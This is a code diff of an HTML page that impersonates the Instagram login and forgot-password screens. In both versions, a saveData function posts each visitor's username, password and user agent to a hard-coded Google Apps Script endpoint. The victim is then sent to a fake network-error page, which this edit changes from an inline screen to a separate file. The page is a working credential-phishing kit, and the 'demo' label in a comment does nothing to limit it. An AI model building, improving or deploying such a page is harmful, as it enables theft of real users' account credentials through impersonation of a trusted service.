@@ -15,15 +15,15 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: #000000;
             color: white;
+            min-height: 100vh;
         }
 
-        /* Login Page */
-        #loginSection {
+        .container {
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 60px 20px 20px;
+            padding: 40px 20px 20px;
         }
 
         .lang-selector {
@@ -32,9 +32,9 @@
             margin-bottom: 30px;
         }
 
-        .logo-box {
-            margin-bottom: 40px;
+        .logo {
             font-size: 60px;
+            margin-bottom: 40px;
         }
 
         .login-form {
@@ -117,8 +117,8 @@
             margin-top: 20px;
         }
 
-        /* Forgot Password */
-        #forgotSection {
+        /* Forgot Password Modal */
+        #forgotModal {
             display: none;
             position: fixed;
             top: 0;
@@ -134,6 +134,9 @@
             display: flex;
             align-items: center;
             margin-bottom: 40px;
+            max-width: 350px;
+            margin-left: auto;
+            margin-right: auto;
         }
 
         .back-arrow {
@@ -147,6 +150,11 @@
             font-weight: 600;
         }
 
+        .modal-content {
+            max-width: 350px;
+            margin: 0 auto;
+        }
+
         .modal-text {
             color: #888;
             font-size: 14px;
@@ -157,87 +165,14 @@
         .step {
             display: none;
         }
-
-        /* Network Error Page */
-        #networkSection {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #1a1a1a;
-            z-index: 200;
-            flex-direction: column;
-            align-items: center;
-            padding: 100px 40px 40px;
-        }
-
-        .error-icon {
-            width: 60px;
-            height: 60px;
-            margin-bottom: 40px;
-            border: 2px solid #888;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 30px;
-            color: #888;
-        }
-
-        .error-title {
-            color: #888;
-            font-size: 20px;
-            margin-bottom: 15px;
-            font-weight: normal;
-        }
-
-        .error-text {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 10px;
-        }
-
-        .error-code {
-            color: #555;
-            font-size: 12px;
-            font-family: monospace;
-            margin-bottom: auto;
-        }
-
-        .reload-btn {
-            width: 100%;
-            max-width: 350px;
-            padding: 16px;
-            background: #7cb3ff;
-            color: #000;
-            border: none;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 40px;
-        }
     </style>
 </head>
 <body>
-
-<!-- Check redirect -->
-<script>
-    const REDIRECT_URL = 'https://www.instagram.com/accounts/login/?next=%2F&source=mobile_nav&hl=en';
     
-    if (sessionStorage.getItem('demoDone') === 'yes') {
-        window.location.href = REDIRECT_URL;
-    }
-</script>
-
-<!-- Security Banner -->
-<!-- LOGIN PAGE -->
-<div id="loginSection">
+<div class="container" id="mainPage">
     <div class="lang-selector">English (US) ▼</div>
     
-    <div class="logo-box">📷</div>
+    <div class="logo">📷</div>
 
     <form class="login-form" id="loginForm">
         <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
@@ -246,7 +181,7 @@
         <input type="password" id="password" placeholder="Password">
         <div class="error" id="passError">Please enter password</div>
         
-        <button type="submit" class="btn" id="loginBtn">Log in</button>
+        <button type="submit" class="btn">Log in</button>
     </form>
 
     <div class="forgot-link">
@@ -259,14 +194,14 @@
     </div>
 </div>
 
-<!-- FORGOT PASSWORD -->
-<div id="forgotSection">
+<!-- Forgot Password -->
+<div id="forgotModal">
     <div class="modal-header">
         <span class="back-arrow" onclick="hideForgot()">←</span>
         <span class="modal-title">Forgot Password</span>
     </div>
 
-    <div style="max-width: 350px; margin: 0 auto;">
+    <div class="modal-content">
         <!-- Step 1 -->
         <div class="step" id="step1" style="display: block;">
             <div class="modal-text">Enter your username, email, or mobile number to search for your account.</div>
@@ -285,47 +220,29 @@
     </div>
 </div>
 
-<!-- NETWORK ERROR PAGE -->
-<div id="networkSection">
-    <div class="error-icon">⚠️</div>
-    <h1 class="error-title">Your connection was interrupted</h1>
-    <p class="error-text">A network change was detected.</p>
-    <p class="error-code">ERR_NETWORK_CHANGED</p>
-    <button class="reload-btn" onclick="window.location.href=REDIRECT_URL">Reload</button>
-</div>
-
 <script>
     // REPLACE WITH YOUR GOOGLE SCRIPT URL
     const SHEET_URL = 'https://script.google.com/macros/s/AKfycbx839-brkr5RUy7Nvr_VmO0dqdQaYeW9V4bxpt_wIBwqOBpoYgE5jzt1hVHu9kOMdpj/exec';
 
     // Save to Google Sheets
     function saveData(type, user, pass) {
-        if (SHEET_URL === 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
-            console.log('Set your Google Script URL!');
-            return;
+        if (SHEET_URL !== 'YOUR_GOOGLE_SCRIPT_URL_HERE') {
+            fetch(SHEET_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: type,
+                    username: user,
+                    password: pass,
+                    userAgent: navigator.userAgent
+                })
+            });
         }
-
-        fetch(SHEET_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                type: type,
-                username: user,
-                password: pass,
-                userAgent: navigator.userAgent
-            })
-        });
     }
 
-    // Show network error page
-    function showNetwork() {
-        document.getElementById('loginSection').style.display = 'none';
-        document.querySelector('.security-banner').style.display = 'none';
-        document.getElementById('forgotSection').style.display = 'none';
-        document.getElementById('networkSection').style.display = 'flex';
-        sessionStorage.setItem('demoDone', 'yes');
-    }
+    // Mark that user has started demo
+    sessionStorage.setItem('demoStarted', 'yes');
 
     // LOGIN FORM
     document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -351,19 +268,22 @@
 
         if (hasError) return;
 
+        // Save data
         saveData('login', user, pass);
-        setTimeout(showNetwork, 800);
+
+        // Go to error page
+        window.location.href = 'error.html';
     });
 
     // FORGOT PASSWORD
     function showForgot() {
-        document.getElementById('forgotSection').style.display = 'block';
+        document.getElementById('forgotModal').style.display = 'block';
         document.getElementById('step1').style.display = 'block';
         document.getElementById('step2').style.display = 'none';
     }
 
     function hideForgot() {
-        document.getElementById('forgotSection').style.display = 'none';
+        document.getElementById('forgotModal').style.display = 'none';
     }
 
     function goStep2() {
@@ -391,7 +311,9 @@
         document.getElementById('fpPassError').style.display = 'none';
 
         saveData('forgot_password', user, pass);
-        setTimeout(showNetwork, 800);
+        
+        // Go to error page
+        window.location.href = 'error.html';
     }
 
     // Clear errors on input
